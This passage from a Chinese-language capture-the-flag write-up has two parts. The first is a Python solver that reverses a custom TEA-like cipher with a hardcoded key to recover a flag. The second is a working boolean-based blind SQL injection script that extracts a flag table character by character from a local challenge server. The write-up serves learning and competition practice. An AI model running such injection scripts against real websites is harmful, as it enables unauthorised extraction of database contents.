    return x & 0xFFFFFFFF

def F(param_A, param_B, sub_key, round_const):
    term1 = U32((param_A << 4) ^ (param_B >> 3))
    term2 = U32((param_A >> 5) ^ (param_B << 2))
    term3 = U32(round_const ^ param_B)
    term4 = U32(sub_key ^ param_A)
    return U32(U32(term1 + term2) ^ U32(term3 + term4))

def encrypt(plain_dwords, key):
    s = [U32(c) for c in plain_dwords]
    round_sum = U32(0)
    delta = 0x61C88647
    for _ in range(11):
        v25 = U32(round_sum - delta)
        key_base_idx = (v25 >> 2) & 3
        k = [key[key_base_idx ^ i] for i in range(4)]
        key_schedule = [k[0], k[1], k[2], k[3], k[0], k[1], k[2], k[3], k[0], k[1]]
        s_next = [0] * 10
        s_next[0] = U32(s[0] + F(s[9], s[1], key_schedule[0], v25))
        s_next[1] = U32(s[1] + F(s_next[0], s[2], key_schedule[1], v25))
        s_next[2] = U32(s[2] + F(s_next[1], s[3], key_schedule[2], v25))
        s_next[3] = U32(s[3] + F(s_next[2], s[4], key_schedule[3], v25))
        s_next[4] = U32(s[4] + F(s_next[3], s[5], key_schedule[4], v25))
        s_next[5] = U32(s[5] + F(s_next[4], s[6], key_schedule[5], v25))
        s_next[6] = U32(s[6] + F(s_next[5], s[7], key_schedule[6], v25))
        s_next[7] = U32(s[7] + F(s_next[6], s[8], key_schedule[7], v25))
        s_next[8] = U32(s[8] + F(s_next[7], s[9], key_schedule[8], v25))
        s_next[9] = U32(s[9] + F(s_next[8], s_next[0], key_schedule[9], v25))
        s = s_next
        round_sum = v25
    return s

def decrypt(cipher_dwords, key):
    s = [U32(c) for c in cipher_dwords]
    delta = 0x61C88647
    round_sum = U32(0 - delta * 11)
    for _ in range(11):
        v25 = round_sum
        key_base_idx = (v25 >> 2) & 3
        k = [key[key_base_idx ^ i] for i in range(4)]
        key_schedule = [k[0], k[1], k[2], k[3], k[0], k[1], k[2], k[3], k[0], k[1]]
        p = [0] * 10
        p[9] = U32(s[9] - F(s[8], s[0], key_schedule[9], v25))
        p[8] = U32(s[8] - F(s[7], p[9], key_schedule[8], v25))
        p[7] = U32(s[7] - F(s[6], p[8], key_schedule[7], v25))
        p[6] = U32(s[6] - F(s[5], p[7], key_schedule[6], v25))
        p[5] = U32(s[5] - F(s[4], p[6], key_schedule[5], v25))
        p[4] = U32(s[4] - F(s[3], p[5], key_schedule[4], v25))
        p[3] = U32(s[3] - F(s[2], p[4], key_schedule[3], v25))
        p[2] = U32(s[2] - F(s[1], p[3], key_schedule[2], v25))
        p[1] = U32(s[1] - F(s[0], p[2], key_schedule[1], v25))
        p[0] = U32(s[0] - F(p[9], p[1], key_schedule[0], v25))
        s = p
        round_sum = U32(round_sum + delta)
    return s


v10_final = [0x63656F6D, 0x21216674]

key_final = [
    v10_final[0], v10_final[1],
    U32(0x12345678), U32(0x9ABCDEF0)
]

target_cipher_dwords = [
    0x5D624C34, 0x8629FEAD, 0x9D11379B, 0xFCD53211,
    0x460F63CE, 0xC5816E68, 0xFE5300AD, 0x0A0015EE,
    0x9806DBBB, 0xEF4A2648
]

decrypted_dwords = decrypt(target_cipher_dwords, key_final)

flag_bytes = b""
for dword in decrypted_dwords:
    flag_bytes += struct.pack('<I', dword)

try:
    decoded_flag = flag_bytes.decode('ascii').strip('\x00')
    print(f"Flag: {decoded_flag}")
except UnicodeDecodeError:
    print("error")

```



## web

### **08 第八章 天衍真言，星图显圣**

这里用的是盲注，一开始被大小写坑了，sql字符比较一般不区分大小写......

```python
import requests
import string
from urllib.parse import quote


base_url = "http://127.0.0.1:50302/"
success_indicator = "Welcome"
max_retries = 5
request_timeout = 10
max_flag_length = 100


PRIORITY_CHARS = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +  "0123456789" + "_{}[]()!@#$%^&*+-=;:'\",.<>/?|\\~` "

def check_payload(payload):
    encoded_payload = quote(payload)
    target_url = f"{base_url}?username={encoded_payload}&password=123"
    
    for attempt in range(max_retries):
        try:
            r = requests.get(target_url, timeout=request_timeout)
            if success_indicator in r.text:
                return True
            return False
        except Exception as e:
            pass
    return False

def extract_flag():
    length = 0
    for l in range(30, 70):
        payload = f"' or length((select * from flag))={l}-- "
        if check_payload(payload):
            length = l
            print(f"Flag长度: {length}")
            break
    if length == 0:
        length = 50
    flag = ""
    length+=1
    for position in range(1, length + 1):
        found_char = None
        for char in PRIORITY_CHARS:
            # 使用BINARY强制区分大小写
            payload = f"' or BINARY substr((select * from flag),{position},1)='{char}'-- "
            
            if check_payload(payload):
                found_char = char
                flag += char
                print(f"位置 {position}: {char} | 当前flag: {flag}")
                break
        if found_char is None:
            flag += "?"
    
    return flag

if __name__ == "__main__":
    flag = extract_flag()
    print("flag:", flag)

```

### 待更......

> web太多太杂，不想写了